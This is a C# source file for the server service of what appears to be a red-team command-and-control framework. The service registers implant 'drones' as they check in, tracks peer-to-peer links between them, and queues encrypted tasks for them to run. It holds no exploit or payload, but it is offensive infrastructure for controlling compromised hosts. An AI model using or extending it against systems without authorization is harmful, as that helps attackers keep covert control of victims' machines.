using System.Reflection;

using Microsoft.AspNetCore.SignalR;

using TeamServer.Drones;
using TeamServer.Hubs;
using TeamServer.Interfaces;
using TeamServer.Messages;
using TeamServer.Modules;

using TaskStatus = TeamServer.Tasks.TaskStatus;

namespace TeamServer.Services;

public class ServerService : IServerService
{
    public IDroneService Drones { get; }
    public IPeerToPeerService PeerToPeer { get; }
    public ITaskService Tasks { get; }
    public ICryptoService Crypto { get; }
    public IReversePortForwardService PortForwards { get; }
    public IHubContext<NotificationHub, INotificationHub> Hub { get; }
    
    private readonly List<ServerModule> _modules = new();

    public ServerService(IDroneService drones, IPeerToPeerService peerToPeer, ITaskService tasks, ICryptoService crypto,
        IReversePortForwardService portForwards, IHubContext<NotificationHub, INotificationHub> hub)
    {
        Drones = drones;
        PeerToPeer = peerToPeer;
        Tasks = tasks;
        Crypto = crypto;
        PortForwards = portForwards;
        Hub = hub;

        LoadModules();
    }

    public async Task HandleInboundFrame(C2Frame frame)
    {
        // do a check-in here, mostly for p2p drones
        var drone = await Drones.Get(frame.DroneId);
        
        if (drone is not null)
        {
            drone.CheckIn();
            
            await Drones.Update(drone);
            await Hub.Clients.All.DroneCheckedIn(drone.Metadata.Id);
        }
        
        // handle the inbound frame
        var module = _modules.First(m => m.FrameType == frame.Type);
        await module.ProcessFrame(frame);
    }

    public async Task<IEnumerable<C2Frame>> GetOutboundFrames(Metadata metadata)
    {
        // handle check-in first
        await HandleCheckIn(metadata);
        
        var outbound = new List<C2Frame>();
        var search = PeerToPeer.DepthFirstSearch(metadata.Id);

        foreach (var droneId in search)
        {
            var pending = (await Tasks.GetPending(droneId)).ToList();

            foreach (var record in pending)
            {
                // update status and date
                record.Status = TaskStatus.TASKED;
                record.StartTime = DateTime.UtcNow;

                // map it to a task
                var task = (DroneTask)record;

                // pack into a frame
                outbound.Add(new C2Frame(record.DroneId, FrameType.TASK, await Crypto.Encrypt(task)));
            
                // tell hub
                await Hub.Clients.All.TaskUpdated(record.DroneId, record.TaskId);
            }
        
            // update db
            await Tasks.Update(pending);
        
            // add any cached frames
            outbound.AddRange(Tasks.GetCachedFrames(droneId));
        }

        return outbound.ToArray().Reverse();
    }

    private async Task HandleCheckIn(Metadata metadata)
    {
        var drone = await Drones.Get(metadata.Id);

        if (drone is null)
        {
            drone = new Drone(metadata);

            PeerToPeer.AddVertex(drone.Metadata.Id);
            await Drones.Add(drone);
            await Hub.Clients.All.NewDrone(drone.Metadata.Id);
        }
        else
        {
            drone.CheckIn();

            await Drones.Update(drone);
            await Hub.Clients.All.DroneCheckedIn(drone.Metadata.Id);
        }
    }

    private void LoadModules()
    {
        var self = Assembly.GetExecutingAssembly();

        foreach (var type in self.GetTypes())
        {
            if (!type.IsSubclassOf(typeof(ServerModule)))
                continue;

            var module = (ServerModule)Activator.CreateInstance(type);

            if (module is null)
                continue;

            module.Init(this);
            _modules.Add(module);
        }
    }
}